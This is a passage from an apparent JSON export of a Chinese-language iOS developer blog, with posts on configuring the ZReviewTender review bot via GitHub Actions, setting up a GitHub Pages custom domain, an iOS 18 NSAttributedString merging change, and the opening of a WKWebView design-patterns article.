Translation API」： 啟用後可以使用同一個 Service Account (服務帳戶) 憑證，串接評價自動翻譯功能 請注意：Cloud Translation API 並非免費，偵測語言、翻譯都會產生費用！ 請注意：Cloud Translation API 並非免費，偵測語言、翻譯都會產生費用！ 請注意：Cloud Translation API 並非免費，偵測語言、翻譯都會產生費用！建立 Service Account (服務帳戶)： 搜尋「IAM」 選擇「IAM &amp; Admin」 選擇「服務帳戶 (Service Account)」 選擇「建立服務帳戶 (Service Account)」 服務帳戶名稱：自行輸入，可輸入「 ZReviewTender 」or「 Google Play Review Bot 」 服務帳戶 ID：自動帶入，沒特殊需求不用變更，這同時也會是你的 Service Account Email 點擊「完成」記下這組服務帳戶 Service Account 的信箱地址： 列表頁也會顯示 Service Account Email 地址 記下 Service Account Email ，稍後設定使用建立服務帳號 Service Account 金鑰憑證： 重整列表頁面，點擊進入剛剛創建的 服務帳號 Service Account 點擊「新增金鑰」 點擊「建立新的金鑰」 金鑰類型選擇「JSON」 點擊「建立」 保存下載下來的「 XXXX-XXXX.json 」檔案，稍後設定使用將服務帳戶加入 Google Play Console 並賦予 要撈取評價的目標 App 權限：進入到 Google Play Console 後台： 點擊「Users and permissions」 點擊右方「Invite new users」 Email address 輸入剛剛記下來的 Service Account Email App permissions -&gt; Add app 加入 要撈取評價的目標 App 點擊「Invite user」 即可完成邀請，無需驗證取得 Google Play Console Developer ID &amp; App ID &amp; Package Name 資訊： 點擊 要撈取評價的目標 App 進入 Dashboard 記下 Package Name ，稍後設定使用複製 Dashboard 網址，從網址中找到：3.其中 /developers/ XXX 就是你的 Developer ID ，記下這串數字 Developer ID，稍後設定使用4.其中 /app/ XXX 就是你的 App ID ，記下這串數字 App ID，稍後設定使用 身份憑證設定完成。Step 3. Github Action 部署、設定檔填寫令人振奮的事是，我已經將繁瑣的 Github Repo, Github Action 設定流程打包成 Repo Template &amp; Marketplace Github Action，您只要照以下幾個步驟就可以完成工作。前往： ZReviewTender-deploy-with-github-action ：https://github.com/ZhgChgLi/ZReviewTender-deploy-with-github-action Repository name：輸入你想要的 Repo 名稱 Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️ Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️ Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️ 點擊「Create repository」 ZReviewTender 作者、貢獻者、ZhgChgLi 並不會因為您使用 ZReviewTender 造成的任何損失負責。等待 Repository 建立：再次確認建立的是 Private Repo： Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️ Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️ Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️啟用 Github Actions 權限： Repo 建立完成後，因 Github 安全設定，要先去 Repo Settings 允許 Github Actions 執行。 Repo -&gt; Settings 選擇「Actions」 -&gt; 「General」 Actions permissions 選擇「Allow all actions and reusable workflows」 點擊「Save」 Workflow permissions 選擇「Read repository contents and packages permissions」首次執行，初始化 ZReviewTender： Repo -&gt; Actions 選擇「Init ZReviewTender」 選擇「Run workflow」 點擊「Run workflow」 重整頁面等待 init ZReviewTender Action 完成： 如果出現 ❌ Error：請重新檢查前面提到的 Github Actions 權限設定是否正確。初始化成功回到 Repo 首頁會出現兩個新目錄：上傳所需的憑證檔案： 進入 /config 目錄 右上角「Add file」-&gt; 「Upload files」 將 Step 2. 保存下來的 GCP Service Account XXXX-XXXX.json (for Android)與 App Store Connect 保存下來的 AuthKey_XXXXXXXXXX.p8 (for iOS)一同上傳。 等待上傳完成 選擇「Commit directly to the main branch」 點擊「Commit changes」設定 Apple (iOS)： 進入 config/ 目錄，點擊 apple.yml 檔案 點擊右上角「🖊️編輯」編輯 apple.yml ，貼上以下內容並填入前幾步記下來的資訊：platform: 'apple'appStoreConnectP8PrivateKeyFilePath: './config/AuthKey_XXXXXXXXXX.p8' # APPLE STORE CONNECT API PRIVATE .p8 KEY File PathappStoreConnectP8PrivateKeyID: 'Private Key ID' # APPLE STORE CONNECT API PRIVATE KEY IDappStoreConnectIssueID: 'Issuer ID' # APPLE STORE CONNECT ISSUE IDappID: 'App ID' # APP IDprocessors: - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review message in 1 slack message. slackBotToken: \"Slack App Bot User OAuth Token\" # Slack Bot Token, send slack message throught Slack Bot. slackBotTargetChannel: \"Target Channel ID\" # Slack Bot Token, send slack message throught Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack In-Comming WebHook URL, Send slack message throught In-Comming WebHook, not recommended, deprecated. appStoreConnectP8PrivateKeyFilePath : 輸入 ./config/AuthKey_XXXXXXXXXX.p8 (Step 2. App Store Connect 保存下來的 AuthKey_XXXXXXXXXX.p8 檔案名稱) appStoreConnectP8PrivateKeyID : Step 2. App Store Connect 記下來的 Private Key ID appStoreConnectIssueID : Step 2. App Store Connect 記下來的 Issuer ID appID : Step 2. App Store Connect 記下來的目標撈取 App 的 App ID slackBotToken : 輸入 Step 1. 記下的 Slack App Bot User OAuth Token slackBotTargetChannel : 輸入 Step 1. 記下的 要傳送到的 Channel ID 編輯完成後點擊右上角「Commit changes…」 選擇「Commit directly to the main branch」 點擊「Commit changes」設定 Android： 進入 config/ 目錄，點擊 android.yml 檔案 點擊右上角「🖊️編輯」編輯 android.yml ，貼上以下內容並填入前幾步記下來的資訊：platform: 'android'packageName: 'Package Name' # Android App Package NamekeyFilePath: './config/XXXX-XXXX.json' # Google Android Publisher API Service Account Credential .json File PathplayConsoleDeveloperAccountID: 'Developer ID' # Google Console Developer Account IDplayConsoleAppID: 'App ID' # Google Console App IDprocessors:- SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review message in 1 slack message. slackBotToken: \"Slack App Bot User OAuth Token\" # Slack Bot Token, send slack message throught Slack Bot. slackBotTargetChannel: \"Target Channel ID\" # Slack Bot Token, send slack message throught Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack In-Comming WebHook URL, Send slack message throught In-Comming WebHook, not recommended, deprecated. packageName : Step 2. Google Play Console 後台記下來的 Package Name keyFilePath : 輸入 ./config/XXXX-XXXX.json (Step 2. GCP IAM 保存下來的 XXXX-XXXX.json Service Account 金鑰檔案名稱) playConsoleDeveloperAccountID : Step 2. Google Play Console 後台記下來的 Developer ID playConsoleAppID : Step 2. Google Play Console 後台記下來的 App ID slackBotToken : 輸入 Step 1. 記下的 Slack App Bot User OAuth Token slackBotTargetChannel : 輸入 Step 1. 記下的 要傳送到的 Channel ID 編輯完成後點擊右上角「Commit changes…」 選擇「Commit directly to the main branch」 點擊「Commit changes」 設定完成！ 🚀🚀🚀🚀驗證設定是否成功：我們可以手動執行一次，確認設定無誤。 Repo -&gt; Actions 選擇「ZReviewTender」 選擇「Run workflow」 點擊「Run workflow」 重整頁面等待 ReviewTender Action 完成：驗證成功🎉🎉🎉🎉 如果出現 ❌ Error、Slack Channel 未收到啟動訊息：請重新檢查前面設定檔案內容是否正確。完成 🎉🎉🎉現在你可以依靠這個免費可靠的 App 評價機器人時刻關注使用者的最新評價了！Buy me coffee ❤️❤️❤️https://www.buymeacoffee.com/zhgchgli 如果這個專案有幫助到您，歡迎贊助我一杯咖啡，謝謝。其他設定加上過濾功能只轉發符合條件的評價。 - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out (territory for Apple e.g. TWN) 您只要在 /config/apple.yml 或 /config/android.yml 的 processors 區塊加上 FilterProcessor 設定。加上自動翻譯功能將非您語言的評價自動使用 Google Cloud Translation API 進行翻譯 (需消耗費用)。 請先確定 Step 2. 建立的 Service Account 所屬 GCP Project 有啟用「Cloud Translation API」 apple.yml 與 android.yml 設定有一些不同apple.yml: - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't needed it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: './config/XXXX-XXXX.json' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"TWN\",\"CHN\"] # Review origin Territory that you don't want to translate. (territory for Apple e.g. TWN) ./config/XXXX-XXXX.json (Step 2. GCP IAM 保存下來的 XXXX-XXXX.json Service Account 金鑰檔案名稱)android.yml: - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't needed it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: './config/XXXX-XXXX.json' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"zh-Hant\",\"zh-Hans\"] # Review origin Territory (language) that you don't want to translate. (language for android e.g. zh-Hant, en) ./config/XXXX-XXXX.json (Step 2. GCP IAM 保存下來的 XXXX-XXXX.json Service Account 金鑰檔案名稱)完整組合範例：platform: 'android'packageName: '' # Android App Package NamekeyFilePath: '' # Google Android Publisher API Service Account Credential .json File PathplayConsoleDeveloperAccountID: '' # Google Console Developer Account IDplayConsoleAppID: '' # Google Console App IDprocessors: - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out (territory for Apple e.g. TWN) - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't needed it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: '' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"zh-Hant\",\"zh-Hans\"] # Review origin Territory (language) that you don't want to translate. (language for android e.g. zh-Hant, en) - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review message in 1 slack message. slackBotToken: \"\" # Slack Bot Token, send slack message throught Slack Bot. slackBotTargetChannel: \"\" # Slack Bot Token, send slack message throught Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack In-Comming WebHook URL, Send slack message throught In-Comming WebHook, not recommended, deprecated.調整完畢一樣照以下步驟儲存 .yml ： 編輯完成後點擊右上角「Commit changes…」 選擇「Commit directly to the main branch」 點擊「Commit changes」執行參數設定您可以編輯 ZReviewTender.yml 檔案設定執行參數。 Repo -&gt; Actions 點擊「ZReviewTender」 點擊「 ZReviewTender.yml 」 點擊右上角「🖊️編輯」name: ZReviewTenderon: workflow_dispatch: schedule: - cron: \"15 */6 * * *\" #check new review every 6 hour.jobs: ZReviewTender: runs-on: ubuntu-latest steps: - name: ZReviewTender Automatic Bot uses: ZhgChgLi/ZReviewTender@main with: command: '-r'調整檢查頻率 (多久爬取轉發一次新評價?)調整 cron: \"15 */6 * * *\" 裡的設定值。參數使用 Crontab 表示，您可以使用 以下網站 產生想要的設定參數：https://crontab.guru/調整執行腳本調整 command: \"-r\" 裡的設定值。 -r : 同時執行 Android 和 Apple (iOS) 評價檢查 -a : 紙執行 Apple (iOS) 評價檢查 -g : 只執行 Android 評價檢查調整完畢： 編輯完成後點擊右上角「Commit changes…」 選擇「Commit directly to the main branch」 點擊「Commit changes」暫時停止檢查 Repo -&gt; Actions 選擇「ZReviewTender」 點擊右方「…」 選擇「Disable workflw」問題回報及功能建議如果您有任何功能建議或問題、Bug，請前往以上 Github Repo 建立 Issue 回報，謝謝。進階使用及開發故事 ZReviewTender — 免費開源的 App Reviews 監控機器人 App Store Connect API 現已支援 讀取和管理 Customer Reviews ZReviewsBot — Slack App Review 通知機器人 AppStore APP’s Reviews Slack Bot 那些事有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 196 Total Views Last Statistics Date: 2025-01-19 | 103 Views on Medium. " }, { "title": "Github Pages 自訂網域教學", "url": "/posts/483af5d93297/", "categories": "ZRealm Dev.", "tags": "ios-app-development, github-pages, github, domain-names, namecheap", "date": "2024-09-22 17:14:16 +0800", "snippet": "Github Pages 自訂網域教學使用你的網域替代原本的 github.io 網址關於 Github PagesGithub Pages 是由 Github 提供的免費靜態頁面寄存服務，所有 Github Free 帳號只要是 Public Repo 都能直接使用，如果是 Private Repo 則須先付費升級 Github 帳號。ZhgChgLi ZhgChgLi iOS Devel...", "content": "Github Pages 自訂網域教學使用你的網域替代原本的 github.io 網址關於 Github PagesGithub Pages 是由 Github 提供的免費靜態頁面寄存服務，所有 Github Free 帳號只要是 Public Repo 都能直接使用，如果是 Private Repo 則須先付費升級 Github 帳號。ZhgChgLi ZhgChgLi iOS Developer 求知若渴 教學相長 更愛電影/美劇/西音/運動/生活 zhgchg.li 我使用 Github Pages 部署的 Jekyll Blog 無痛轉移 Medium 到 Github Pages ➡️➡️➡️限制 只能寄存靜態檔案資源： HTML, CSS, JavaScript, 字體檔案, 圖片檔案, PDF, 音訊檔案, 文字檔案…等等 網站(Repo)大小不得超過： 1 GB這猜測也是軟限制，因為我的 Github Pages Jekyll Repo 已經快 5 GB 了。 部署工作時間最長： 10 分鐘 每小時最多部署： 10 次 (軟限制) 每月流量限制 ：100 GB (軟限制) 請求過於頻繁可能會響應 HTTP 429 ⭐️⭐️⭐️若只想了解 Github Pages 自訂網域教學 請繼續往下閱讀。Github Pages 教學，搭配 ChatGPT 不會程式也能打造個人網站以下以程式小白、不會 Git 為範例。1.註冊、登入 Github： https://github.com/ 登入 Github 後選擇右上角「+」-&gt;「New repository」2. 輸入 Repo 名稱、設定 Repository name： 輸入你的帳號.github.io Public：公開的專案 Add a README file：方便建立後可直接使用 Github Web 新增檔案 Create repositoryRespository name 的部分每個帳號或組織(Organization) 只能建立一個 你的帳號.github.io 的主 Github Pages Repo，其他 Repo 若也想要部署到 Github Pages 網址會是 你的帳號.github.io/Reop名稱 ，例如： 你的帳號/你的帳號.github.io Repo -&gt; 你的帳號.github.io 你的帳號/mywebdemo Repo -&gt; 你的帳號.github.io/mywebdemo如為非 你的帳號.github.io 的主 Github Pages Repo，需要再去 Settings 設定 Pages 才能啟用 GitHub Pages：例如我的 Repo zhgchgli0718/testgithubpage 也想有 Github Pages 頁面。 Settings -&gt; Pages -&gt; Branch -&gt; 選擇 main/root -&gt; Save 完成3. 建立你的首頁 .html 檔案 在 Repo 首頁點擊右上角綠色按鈕「Code」 選擇「+ Create new file」4. 使用 ChatGPT 協助您產生頁面 .html 檔案 這邊用最簡單的 Prompt： 產生一個賽博龐克風的 歡迎頁面 (.html)5. 貼上 .html 回 Github Repo File 檔案名稱：輸入 index.html Edit：貼上 ChatGPT 產生的 .html 內容，可以使用 ChatGPT 調整你要的 html 或是直接在這邊編輯 HTML 內容 點右上角「Commit changes…」 選擇「Commit directly to the main branch」—上傳資源檔案(例如：圖片)： 一樣點擊「Add file」選擇「Upload files」 拖曳或選擇檔案，等待上傳完成 點擊「Commit changes」 完成6. 等待部署如同前述，Github Pages 需要部署，不是存檔就會出現；我們可以點 Repo 上方的「Actions」查看部署進度，直到橘燈🟠變成綠色勾勾✅代表部署完成了。7. 查看成果https://zhgchgli0718.github.io/ 前往： https://你的帳號.github.io 查看成果Github Pages 自訂網域教學再來才是本篇重點，Github Page 自訂網域，如前述，預設我們只能使用 你的帳號.github.io 做為你的靜態網站主網域；如果是其他 Repo 還只能透過 /路徑 訪問，沒辦法創造第二個 *.github.io 。但 Github Pages 佛心的事是提供自訂網域功能。 ⭐️⭐️⭐️ 購買的網域同時也能用在： Medium 自訂網域功能。 例如我的網域： 1. https://zhgchg.li -&gt; 用在 Github Pages Jekyll Blog 2. https://blog.zhgchg.li -&gt; 用在我的 Medium 頁面1. 購買＆取得域名 by Namecheap (老牌網域大廠)首先到 Namecheap 官網首頁 搜尋喜歡的域名：得到搜尋結果：右邊按鈕顯示「 Add To Cart 」代表該域名還沒有人註冊，可以加入購物車購買。如果右邊按鈕顯示「 Make offer 」、「 Taken 」代表該域名已被註冊，請選擇其他後綴或換個域名：加入購物車後點擊下方「 Checkout 」。進入訂單確認頁： Domain Registration ：這邊可以選擇 AUTO-RENEW 每年自動續費，也可以改要一次購買的年數。 WhoisGuard ：由於 網域資料可以公開讓任何人自由查詢 （註冊時間、到期日、註冊人、聯繫方式）；此功能可以將註冊人及聯繫方式改為顯示 Namecheap，而非直接顯示你的個人資料，可以防止垃圾郵件訊息。（此功能部分後綴是要收費的，如果是免費的話就用吧！）擷取一些 google.com 的 whois 訊息結果，可 由此查詢 。 PremiumDNS ：我們知道域名等於門牌，也就是說看到門牌會去找位置在哪；這個功能就是提供更穩定安全的「找位置在哪」功能，我是覺得不必，除非是一點錯誤都不能出的高流量電商網站之類。輸入完信用卡資訊點「 Confirm Order 」之後就購買成功囉！會收到一封訂單明細信件。2. 網域設定by Namecheap前往 Account -&gt; Dashboard:找到你要設定的網域 -&gt; 右邊點擊「Manage」:確定 Domain -&gt; NAMESERVERS -&gt; 選擇「Namecheap BasicDNS」：切換到「Advanced DNS」-&gt; 加入 A Record： 點擊「ADD NEW RECORD」 Type 選擇「A Record」 Host 輸入「 @ 」 Value 依序輸入：185.199.108.153185.199.109.153185.199.110.153185.199.111.153四筆紀錄。 每一筆輸入完就點「✔️」儲存設定。 完成。3. 依照想設定的 Github Pages Repo 加入 CNAME Record： 點擊「ADD NEW RECORD」 Type 選擇「CNAME Record」 Host 輸入，看你希望的 subdomain，如果希望是一級網域則輸入「 www 」 Value 輸入： 你的帳號.github.io4. 回到 Github Repo 設定 Github Repo -&gt; Settings -&gt; Pages Custom domain：輸入 你的網域 (若為 www. 可省略) 點擊 Save 可以勾選強制使用 HTTPS 增加訪問安全性。等待 DNS Check… 通常在五分鐘內能確認，但依照 DNS 機制最長可能需要 72 小時設定才會生效， 如果確定步驟沒錯但一直確認失敗不妨過幾天再回來試試。設定成功！前往你的網域驗證結果：成功！🎉🎉🎉 現在我們不用在使用舊的 https://你的帳號.github.io 訪問你的 Github Pages，可以直接使用 https://你的網域 進行訪問囉！ 其他 Repo 的 Github Pages 也可以透過 https://你的網域/Repo 名稱 進行訪問。其他文章Medium 自訂網域Medium 自訂網域無痛轉移 Medium 到 Github Pages無痛轉移 Medium 到 Github Pages有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 589 Total Views Last Statistics Date: 2025-01-19 | 537 Views on Medium. " }, { "title": "iOS ≥ 18 NSAttributedString attributes Range 合併的一個行為改變", "url": "/posts/9e43897d99fc/", "categories": "ZRealm Dev.", "tags": "ios-app-development, nsattributedstring, ios-18, ios, swift", "date": "2024-09-20 21:03:42 +0800", "snippet": "iOS ≥ 18 NSAttributedString attributes Range 合併的一個行為改變iOS ≥ 18 開始 NSAttributedString attributes Range 合併會參考 EquatablePhoto by C M問題起因iOS 18 2024/9/17 上線後，之前做的開源專案 ZMarkupParser 就有開發者回報 iOS 18 在解析部分...", "content": "iOS ≥ 18 NSAttributedString attributes Range 合併的一個行為改變iOS ≥ 18 開始 NSAttributedString attributes Range 合併會參考 EquatablePhoto by C M問題起因iOS 18 2024/9/17 上線後，之前做的開源專案 ZMarkupParser 就有開發者回報 iOS 18 在解析部分 HTML 時會發生閃退。看到這個 Issue 有點困惑，因為程式在以前都沒問題，iOS 18 開始才會閃退，不符合常理，應該是 iOS 18 底層 Foundation 有什麼調整導致。Crash TraceTrace Code 後定位到閃退問題點是遍歷 .breaklinePlaceholder Attributes 並針對 Range 進行刪除操作時會發生閃退:mutableAttributedString.enumerateAttribute(.breaklinePlaceholder, in: NSMakeRange(0, NSMakeRange(0, mutableAttributedString.string.utf16.count))) { value, range, _ in // ...if condition... // mutableAttributedString.deleteCharacters(in: preRange) // ...if condition... // mutableAttributedString.deleteCharacters(in: range)}.breaklinePlaceholder 是我自行擴充的一個 NSAttributedString.Key，用來標記 HTML 標籤資訊，優化換行符號使用:struct BreaklinePlaceholder: OptionSet { let rawValue: Int static let tagBoundaryPrefix = BreaklinePlaceholder(rawValue: 1) static let tagBoundarySuffix = BreaklinePlaceholder(rawValue: 2) static let breaklineTag = BreaklinePlaceholder(rawValue: 3)}extension NSAttributedString.Key { static let breaklinePlaceholder: NSAttributedString.Key = .init(\"breaklinePlaceholder\")} 但核心問題不是這裡 ，因為在 iOS 17 以前，輸入的 mutableAttributedString 在執行以上操作時不會有問題；代表輸入的資料內容在 iOS 18 有所變動。NSAttributedString attributes: [NSAttributedString.Key: Any?]在深入挖掘問題之前先介紹一下 NSAttributedString attributes 的 合併機制 。NSAttributedString attributes 會 自動比較 .key 相同的相鄰 Range Attributes 物件是否相同，相同則合併成同個 Attribute 例如：let mutableAttributedString = NSMutableAttributedString(string: \"\", attributes: nil)mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.font: UIFont.systemFont(ofSize: 14)]))mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.font: UIFont.systemFont(ofSize: 14)]))mutableAttributedString.append(NSAttributedString(string: \"&lt;p&gt;\", attributes: [.font: UIFont.systemFont(ofSize: 14)]))mutableAttributedString.append(NSAttributedString(string: \"Test\", attributes: [.font: UIFont.systemFont(ofSize: 12)]))最終 Attributes 合併結果：&lt;div&gt;&lt;div&gt;&lt;p&gt;{ NSFont = \"&lt;UICTFont: 0x101d13400&gt; font-family: \\\".SFUI-Regular\\\"; font-weight: normal; font-style: normal; font-size: 14.00pt\";}Test{ NSFont = \"&lt;UICTFont: 0x101d13860&gt; font-family: \\\".SFUI-Regular\\\"; font-weight: normal; font-style: normal; font-size: 12.00pt\";}在 enumerateAttribute(.breaklinePlaceholder...) 時會得到以下結果:NSRange {0, 13}: &lt;UICTFont: 0x101d13400&gt; font-family: \".SFUI-Regular\"; font-weight: normal; font-style: normal; font-size: 14.00ptNSRange {13, 4}: &lt;UICTFont: 0x101d13860&gt; font-family: \".SFUI-Regular\"; font-weight: normal; font-style: normal; font-size: 12.00ptNSAttributedString attributes 合併 — 底層實踐方式推測推測底層是使用 Set&lt;Hashable&gt; 做為 Attributes 容器，會自動排除相同的 Attriubte 物件。但是為了使用方便， NSAttributedString attributes: [NSAttributedString.Key: Any?] Value 物件是宣告成 Any? Type，沒有限制 Hashable。也因此推測系統在底層會在 Conform as? Hashable 然後使用 Set 合併管理物件。 這次的 iOS ≥ 18 調整差異推測就是這邊底層的實現問題。以下是以我們自訂的 .breaklinePlaceholder Attributes 為例:struct BreaklinePlaceholder: Equatable { let rawValue: Int static let tagBoundaryPrefix = BreaklinePlaceholder(rawValue: 1) static let tagBoundarySuffix = BreaklinePlaceholder(rawValue: 2) static let breaklineTag = BreaklinePlaceholder(rawValue: 3)}extension NSAttributedString.Key { static let breaklinePlaceholder: NSAttributedString.Key = .init(\"breaklinePlaceholder\")}//let mutableAttributedString = NSMutableAttributedString(string: \"\", attributes: nil)mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.breaklinePlaceholder: NSAttributedString.Key.BreaklinePlaceholder.tagBoundaryPrefix]))mutableAttributedString.append(NSAttributedString(string: \"&lt;div&gt;\", attributes: [.breaklinePlaceholder: NSAttributedString.Key.BreaklinePlaceholder.tagBoundaryPrefix]))mutableAttributedString.append(NSAttributedString(string: \"&lt;p&gt;\", attributes: [.breaklinePlaceholder: NSAttributedString.Key.BreaklinePlaceholder.tagBoundaryPrefix]))mutableAttributedString.append(NSAttributedString(string: \"Test\", attributes: nil))iOS ≤ 17 前會得到以下 Attributes 合併結果：&lt;div&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}&lt;div&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}&lt;p&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}Test{}iOS ≥ 18 會得到以下 Attributes 合併結果：&lt;div&gt;&lt;div&gt;&lt;p&gt;{ breaklinePlaceholder = \"NSAttributedStringCrash.BreaklinePlaceholder(rawValue: 1)\";}Test{} 可以看到同樣的程式在不同版本的 iOS 有不同的結果，這最終導致了後續的 enumerateAttribute(.breaklinePlaceholder..) 中的處理邏輯不合預期造成閃退。⭐️ iOS ≥ 18 NSAttributedString attributes: [NSAttributedString.Key: Any?] 會多參考 Equatable ==⭐️比較 iOS 17/18 有無實現 Equatable/Hashable 的結果 ⭐️⭐️ iOS ≥ 18 會多參考 Equatable ，iOS ≤ 17 則不會。⭐️⭐️結合前述， NSAttributedString attributes: [NSAttributedString.Key: Any?] Value 物件是宣告成 Any? Type， 就觀測結果， iOS ≥ 18 會先參考 Equatable 判斷是否相同，然後再使用 Hashable Set 合併管理物件。結論 NSAttributedString attributes: [NSAttributedString.Key: Any?] 在合併 Range Attribute 時，iOS ≥ 18 會多參考 Equatable，這點與以往不同。另外在 iOS 18 開始如果只宣告 Equatable XCode Console 也會輸出 Warning: Obj-C ` -hash` invoked on a Swift value of type `BreaklinePlaceholder` that is Equatable but not Hashable; this can lead to severe performance problems.有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 155 Total Views Last Statistics Date: 2025-01-19 | 143 Views on Medium. " }, { "title": "Design Patterns 的實戰應用紀錄—In WKWebView with Builder, Strategy & Chain of Responsibility Pattern", "url": "/posts/f4b02ee342a4/", "categories": "KKday Tech Blog", "tags": "ios-app-development, design-patterns, chain-of-responsibility, builder-pattern, strategy-pattern", "date": "2024-09-06 13:47:47 +0800", "snippet": "Design Patterns 的實戰應用紀錄—In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern封裝 iOS WKWebView 時使用到的 Design Patterns 場景 (策略、責任鏈、建造模式)。Photo by Dean PughAbout Design Patterns每次講 D...", "content": "Design Patterns 的實戰應用紀錄—In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern封裝 iOS WKWebView 時使用到的 Design Patterns 場景 (策略、責任鏈、建造模式)。Photo by Dean PughAbout Design Patterns每次講 Design Patterns 之前都要提一下，最經典的 GoF 23 種設計模式發表至今已過去 30 年 (1994 年發行)，工具、語言的變化、軟體開發模式的變遷已經不可同日而語，後續在不同領域也延伸出許多新的設計模式；Design Patterns 並不是萬能解、也不是唯一解，他的存在更像是一種「語言代稱」在適合的場景套用適合的設計模式，可以減少開發協作的障礙，例如：這邊套用策略模式，後續維護擴充的人，就可以直接依照策略模式的架構進行迭代，並且設計模式多半都解耦的不錯，對於擴充性、測試性也有顯著的幫助。Design Patterns 的使用心法 不是唯一解 不是萬能解 不能硬套，需按照要解決問題的類型(創建？行為？結構？)、目的選擇對應的設計模式 不能魔改，魔改容易造成後續維護的人誤會，跟語言一樣大家都用蘋果都叫 Apple，如果自己定義叫 Banana 就會變成是一個需要特別知道的開發成本 盡可能避開關鍵字，例如 Factory Pattern 習慣命名為 XXXFactory ，那如果不是工廠模式就不該使用此命名關鍵字 謹慎自己創造模式 ，同前述雖然經典的只有 23 種，但經歷各個領域多年的演化也有很多新的模式，可以先參考網路資料找到適合的模式(畢竟三個臭皮匠勝過一個諸葛亮)，真的沒有再來提出新的設計模式並盡可能發表讓不同領域、不同場境的人一起檢視跟調整 程式終究是寫給人維護的，只要好維護、好擴充，不一定要使用設計模式 團隊要有 Design Patterns 的共識才適合使用 Design Pattern 可以再套 Design Pattern 組合技 Design Patterns 上手要經過實務不斷地淬鍊，才會越來越有什麼場景適合或不適合套用的敏銳度輔助神器 ChatGPT自從有了 ChatGPT 學習 Design Patterns 設計模式的實務應用就更容易，只要把你的問題具體的描述給他，問他有哪些設計模式適合這個場景，他都能給出幾個可能適合的模式並且附上說明；雖然不是每個答案都那麼適合，但他至少給出了幾個可行方向，我們只要再深入這幾個模式結合自己實務場景的問題，最後都能選到不錯的解法！WKWebView 的 Design Patterns 實戰應用場景這次的 Design Patterns 實戰應用是在收斂目前 Codebase 中的 WKWebView 物件功能特性，並開發統一的 WKWebView 元件時在幾個合適的邏輯抽象點套用 Design Patterns 的心得紀錄分享。 完整 Demo 專案程式碼會附在文末。原始無抽象的寫法class WKWebViewController: UIViewController { // MARK - 定義一些變數、開關 讓外部 init 時注入特性... // 模擬商業邏輯：開關 Match 特殊路徑開原生頁面 let noNeedNativePresent: Bool // 模擬商業邏輯：開關 DeeplinkManager 檢查 let deeplinkCheck: Bool // 模擬商業邏輯：是開首頁嗎？ let isHomePage: Bool // 模擬商業邏輯：要注入到 WKWebView 的 WKUserScript 的腳本 let userScripts: [WKUserScript] // 模擬商業邏輯：要注入到 WKWebView 的 WKScriptMessageHandler 的腳本 let scriptMessageHandlers: [String: WKScriptMessageHandler] // 是否允許從 WebView 取得 Title 複寫 ViewController Title let overrideTitleFromWebView: Bool let url: URL // ... }// ...extension OldWKWebViewController: WKNavigationDelegate { // MARK - iOS WKWebView 的 navigationAction Delegate，用於讓我們決定即將載入的連結要怎麼處理 // 結束務必呼叫 decisionHandler(.allow) or decisionHandler(.cancel) // decisionHandler(.cancel) 將中斷載入即將載入的頁面 // 這邊模擬了不同的變數、開關會有不同的邏輯處理： func webView(_ webView: WKWebView, decidePolicyFor navigationAction: 